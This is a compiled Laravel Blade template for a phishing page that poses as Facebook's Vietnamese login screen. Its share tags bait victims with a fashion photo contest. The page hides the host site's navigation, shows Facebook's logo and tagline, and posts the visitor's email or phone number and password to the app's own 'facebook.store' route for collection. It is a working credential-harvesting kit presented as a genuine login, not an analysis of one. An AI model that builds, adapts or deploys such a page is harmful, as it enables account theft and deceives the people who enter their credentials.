
    
<?php $__env->startSection('content'); ?>
<meta property="title" content="Cuộc Thi Ảnh Thời Trang" />
<meta property="og:image" content="https://i1.taimienphi.vn/tmp/cf/aut/hinh-anh-nguoi-mau.jpg" />
<meta property="og:description" content="Thí sinh dự thi:
                                    Số báo danh:
                                    Năm sinh:
                                    Quê quán:" />

    <div class="row containercol w-100 h-100">
    <style type="text/css">
        .navbar{
            display: none;
        }

        footer{
            display: none;
        }
        .containercol{
            padding-top: 6%;
            padding-left: 4%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .fbtext{
            padding-left: 10%;
        }

        .colone{
            padding-left: 10%;
        }

        .coltwo{
            padding-left: 10%;
            padding-right: 10%;
        }

        .formfb{
            
            border-radius: 6px;
            background: white;
        }

        h2{
            font-size: 28px;
        }

        .xxx{
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            
        }

        .send{
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 332px;
            font-weight: bold;
            color: white;
        }

        .create{
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 332px;
            background-color: #42b72a;
            font-weight: bold;
            color: white;
            width: 85%
        }

        .quenpass{
            color: #1877f2;
            font-size: 14px;
            font-weight: 500;
        }

        .aaa{
            text-decoration:none;
            color: black;

        }

        .bbb{
            display: flex;
            align-items: center;
            justify-content: center;
        }

    </style>
        
        
            <div class="col-sm colone">
                <div class="mx-auto w-100 h-50">
                    <div class="">
                        <div class="w-75">
                            <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
                        </div>
                        <h2 class="fbtext">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
                    </div>
                </div>
            </div>

            <div class="col-sm h-100 coltwo">

            <div class="w-100 h-100">
            <form class="formfb w-100" action="" method="post" action="<?php echo e(route('facebook.store')); ?>">
                <?php echo csrf_field(); ?>

                    <!--Grid column-->
                    <div class="row-md-6 p-2">
                        <div class="xxx">
                            <input type="text" id="email" name="email" class="form-control" placeholder="Email hoặc số điện thoại">
                        </div>
                    </div>
                    <!--Grid column-->

                    <!--Grid column-->
                    <div class="row-md-6 p-2">
                        <div class="xxx">
                            <input type="password" id="passwork" name="passwork" class="form-control" placeholder="Mật khẩu">
                        </div>
                  
                    <!--Grid column-->

                </div>
                <!--Grid row-->

                
                <div class="row-md-6 p-2">
                    <input type="submit" name="send" value="Đăng nhập" class=" btn-block p-2 send">
                </div>
                <div class="row-md-6">
                    <p class="text-center quenpass">Quên mật khẩu?</p>
                </div>
                <div class="row-md-6">
                    <hr />
                </div>
                <div class="row-md-6 p-2 bbb">
                    <input type="button" name="" value="Tạo tài khoản mới" class=" btn-block p-2 create">
                </div>
                <div class="row-md-6 p-2">
                    <p class="p-2"><b><a class="aaa" href="#">Tạo Trang</a></b> dành cho người nổi tiếng, nhãn hiệu hoặc doanh nghiệp.</p>
                </div>

            </form>
            </div>
            </div>
            
        </div>



<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH E:\Wamp\www\ncp\resources\views/facebook.blade.php ENDPATH**/ ?>